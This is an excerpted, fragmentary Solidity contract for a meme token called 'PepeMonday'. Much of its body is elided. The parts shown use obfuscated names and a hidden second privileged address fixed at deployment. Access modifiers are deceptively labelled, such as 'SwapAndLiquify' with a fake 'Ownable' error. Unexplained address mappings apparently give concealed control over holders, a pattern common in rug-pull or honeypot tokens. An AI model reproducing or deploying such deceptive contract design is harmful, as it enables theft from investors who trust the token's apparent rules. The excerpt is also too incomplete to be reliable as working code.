...
/**
PepeMonday  $PepeMonday
https://t.me/PepeMondayToken
*/
pragma solidity 0.8.16;
abstract contract PepeMondayAs {
...
interface PepeMondayAsii is PepeMondayAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract PepeMondayAsiii is PepeMondayAs {
...
contract PepeMondayTOKEN is PepeMondayAs, PepeMondayAsi, PepeMondayAsii, PepeMondayAsiii {

    mapping(address => uint256) private sendamount;
  mapping(address => bool) public PepeMondayAsiiZERTY;
    mapping(address => mapping(address => uint256)) private noFeeFromTransfer;
address private PepeMondayRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public PepeMondayPaw;
  address PepeMondayAdr;



    
    constructor(address PepeMondayadressss) {
            // Editable
            PepeMondayAdr = msg.sender;

        _name = "PepeMonday";
        _symbol = "PepeMonday";
  PepeMondayRooter = PepeMondayadressss;        
        uint PepeMondayTotalSupply = 200000000000 * 10**9;
        process(msg.sender, PepeMondayTotalSupply);
    }
    ...
    function transferFrom(
      ...
      modifier SwapAndLiquify() {
        require(PepeMondayRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
  ...
  modifier walo () {
    require(PepeMondayAdr == msg.sender, "Ehi20: cannot permit SwapAndLiquify address");
    _;
